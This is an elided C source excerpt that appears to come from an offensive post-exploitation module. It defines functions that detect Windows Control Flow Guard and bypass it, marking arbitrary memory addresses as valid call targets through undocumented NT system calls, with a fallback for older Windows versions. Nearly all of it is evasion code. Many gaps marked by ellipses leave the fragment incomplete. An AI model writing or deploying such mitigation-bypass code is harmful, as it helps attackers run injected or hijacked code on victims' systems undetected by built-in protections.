...
typedef enum { ProcessUserModeIOPL = 16, ProcessCookie = 36 } PROCESSINFOCLASS;
...
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(HANDLE,
                                                               ...
                                                               PVOID, ULONG,
                                                               PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQueryVirtualMemory(
    HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, PSIZE_T);
DECLSPEC_IMPORT NTSTATUS NTAPI
NTDLL$NtSetInformationVirtualMemory(HANDLE, VIRTUAL_MEMORY_INFORMATION_CLASS,
                                    SIZE_T, MEMORY_RANGE_ENTRY *, PVOID, ULONG);
...
BOOL cfg_enabled() {
  ...
  status = NTDLL$NtQueryInformationProcess(NtCurrentProcess(),
...
BOOL bypass_cfg(PVOID address) {
  ...
  NTSTATUS status =
      NTDLL$NtQueryVirtualMemory(NtCurrentProcess(), address,
  ...
  status = NTDLL$NtSetInformationVirtualMemory(
      NtCurrentProcess(), VmCfgCallTargetInformation, 1, &mre, (PVOID)&vmi,
      (ULONG)sizeof(vmi));

  if (status == 0xC00000F4) {
    /* the size parameter is not valid. try 24 instead, which is a known size
     * for older windows versions */
    status = NTDLL$NtSetInformationVirtualMemory(NtCurrentProcess(),
                                                 VmCfgCallTargetInformation, 1,
                                                 &mre, (PVOID)&vmi, 24);
  }
